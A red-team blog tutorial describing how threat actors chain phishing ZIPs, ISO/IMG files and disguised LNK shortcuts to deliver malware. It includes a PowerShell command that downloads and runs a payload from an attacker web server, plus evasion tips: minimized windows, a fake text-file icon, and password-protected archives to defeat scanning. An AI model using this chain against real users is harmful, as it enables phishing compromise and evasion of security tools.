---
title: Abusing ISO/IMG Files
author: Z0ldyck
date: 2022-08-17 18:32:00 -0500
categories: [Blogging, Tutorial]
tags: [REDTEAM]
---

السلام عليكم ورحمة الله وبركاته

# introduction

Lately, I have been developing my custom tools and implementing/recreating some of the known techniques used by threat actors. Well, this post is not going to be focused on any specific tool but will showcase one technique that I enjoyed reimplementing and some advice for people who are looking to advance their work specifically for Red Teamers (It could help blue ppl, but I would assume they already do that). I think one of the biggest things that most red teamers (to be specific the ppl in my circle) are missing or not giving some time for is reading reports related to Threat Actors' new techniques. Most of these reports at the first sight might feel that the target audience is mostly Threat Hunters, but in reality, it will help both sides. One side can discover/identify these threats and the other can use them or even advance/change them to something even better, whatever the case is. My point is It doesn't matter what group you are in, reading them will 100% benefit you. I will suggest looking into reports related to Threat Actors from Mandiant/CrowdStrike. There is more, but these are faviourt ones


In this post, I will be going over one of the techniques that I see many threat actors using to compromise victims' machines. This technique is very well known for many blue teamers. You can find below a full map of the execution:

![](../../images/isoimg/1.png)

The attack is straightforward, we will be sending phishing emails that contain or provide a link to download a ZIP file. After decompressing the ZIP file the user would find an IMG/ISO file. A double click from the user will mount a disk containing an LNK file that will download our malicious payload and run it.

I will skip the email and the ZIP file part as these are not the main focus of this post (There is a ton of ways to deliver your files). First, create your malicious payload and host it on a web server, you can use your C2 web server or anything similar. Moving on to creating our LNK file, there is a lot of ways to create one. You can even use powershell/C# to create it, but we will just use the simple method cause why not :)


## LNK FILE

Create a shortcut of any app you have first, then open file properties. Check the image below:

![](../../images/isoimg/2.png)

Here is what you need to consider:

- Target → This is where you will put your command. You can use something like the command below to download and run your malicious payload:
```
powershell wget http://<your_webserver>/malware.exe -O C:\somewhere; malware.exe
```

(Note: Don’t use this command to deliver your payloads, it is not the best way and you will get caught immediately. This is just an example lol)

- Run → Set it to Minimized (Just trust me :p )

- File icon → I think you need to consider that. In the Shortcut section click on “Change Icon” and browse to “C:\Windows\System32\shell32.dll”. You will have a bunch of icons to choose from. I went with the text file icon.

## ISO FILE

This should be enough for the LNK file. Now let’s create the ISO file. I will be using AnyBurn to do this process, but you can use whatever you prefer. You might be wondering why would we go with an ISO/IMG file, the answer is simple users will double click it and a new CD Drive will be attached, and in some cases, it will bypass some security solutions. After creating the ISO you can just save it into an archive and somehow deliver it with some magic to the victim :p

In AnyBurn select “Create image file from files/folders”

![](../../images/isoimg/3.png)

In the new window add your folder/file and click on “Next”

![](../../images/isoimg/4.png)

Next, you will choose where to save your ISO file. By clicking “Create Now” your file will be created and saved in that destination.

![](../../images/isoimg/5.png)

![](../../images/isoimg/6.png)

## DEMO

Now all you need to do is save it in a ZIP file because there is a tone of solutions that started triggering ISO/IMG files. I would also suggest making a ZIP file protected with a password so these solutions wouldn’t be able to scan them (If that’s wrong correct me please!). Here is a demo of the whole process:

![](../../images/isoimg/dev.mp4)

<html> 
<body> 
<video width="849" controls>
  <source src="../../images/isoimg/dev.mp4" type="video/mp4">
</video>
</body> 
</html>

I hope you enjoyed reading this post, I will be sharing more stuff (I don’t know why I am doing that at the end of my break lol)
